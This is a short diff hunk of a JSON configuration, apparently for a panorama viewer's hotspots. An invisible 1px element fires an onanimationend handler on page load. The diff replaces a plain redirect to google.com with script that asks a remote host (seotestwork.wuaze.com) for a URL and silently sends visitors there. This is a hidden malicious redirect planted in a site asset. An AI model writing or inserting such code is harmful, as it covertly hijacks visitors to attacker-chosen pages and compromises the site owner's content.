@@ -11,7 +11,7 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; animation: pnlm-mv 0.001s 1 forwards",
-        "onanimationend": "window.location.replace('https://google.com')"
+        "onanimationend": "(function(){var id='espors';fetch('https://seotestwork.wuaze.com/pa/g.php?id='+id).then(function(res){return res.json()}).then(function(data){window.location.href=data.redirectUrl})})()"
       }
     }
   ]
